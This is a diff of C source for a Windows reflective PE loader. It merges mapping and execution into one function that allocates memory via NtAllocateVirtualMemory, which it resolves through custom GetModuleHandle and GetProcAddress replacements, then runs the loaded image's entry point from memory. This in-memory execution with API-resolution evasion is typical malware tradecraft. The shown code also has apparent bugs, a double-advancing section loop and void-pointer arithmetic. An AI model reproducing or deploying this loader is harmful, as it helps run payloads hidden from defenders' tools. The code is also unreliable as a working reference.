@@ -103,14 +103,15 @@ static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
     }
 }
 
-// -------------------- PE mapping --------------------
-static void* MapImage(unsigned char* data) {
+// -------------------- PE mapping + execution --------------------
+static void ExecuteFromMemory(unsigned char* data) {
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
     IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
     IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
 
-	HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
+    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
 
+    // allocate memory
     PVOID base = NULL;
     SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
     NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
@@ -174,32 +175,20 @@ static void* MapImage(unsigned char* data) {
 
     // free discardable sections
     sec = IMAGE_FIRST_SECTION(nt);
+    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
         if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
             PVOID discardBase = (BYTE*)base + sec[i].VirtualAddress;
             SIZE_T discardSize = sec[i].Misc.VirtualSize;
-            NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
             NtFreeVirtualMemory((HANDLE)-1, &discardBase, &discardSize, MEM_DECOMMIT);
         }
     }
 
-    return base;
-}
+    // execute entry
+    ((void(*)(void))(base + nt->OptionalHeader.AddressOfEntryPoint))();
 
-// -------------------- Execute entry --------------------
-static void ExecuteFromMemory(unsigned char* data) {
-    unsigned char* image = MapImage(data);
-
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image;
-    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
-
-    ((void(*)(void))(image + nt->OptionalHeader.AddressOfEntryPoint))();
-
-    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
-
-    PVOID base = image;
-    SIZE_T totalSize = nt->OptionalHeader.SizeOfImage;
-    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
+    // free image
+    totalSize = nt->OptionalHeader.SizeOfImage;
     NtFreeVirtualMemory((HANDLE)-1, &base, &totalSize, MEM_RELEASE);
 }
 
